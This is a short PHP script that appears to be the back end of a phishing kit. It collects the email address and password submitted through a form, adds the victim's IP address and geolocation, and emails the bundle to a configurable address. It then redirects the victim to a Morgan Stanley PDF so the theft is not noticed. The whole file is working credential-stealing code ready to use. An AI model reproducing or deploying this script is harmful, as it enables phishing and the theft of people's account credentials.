<?php
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$adddate=date("D M d, Y g:i a");
$message .= "|----------| E M A I L  |--------------|\n";
$message .= "|eMail : ".$_POST['Email']."\n";
$message .= "|PasSword : ".$_POST['Password']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "Date: ".$adddate."\n";
$message .= "|----------- NEW 2017 --------------|\n";
//>> CHANGE YOUR EMAIL HERE  <<
$send = "test@gmail.com";
$subject = "$country | $ip";
{
mail("$send", "$subject", $message);   
}
header("Location: https://www.morganstanleyfa.com/public/projectfiles/onthemarkets.pdf");
?>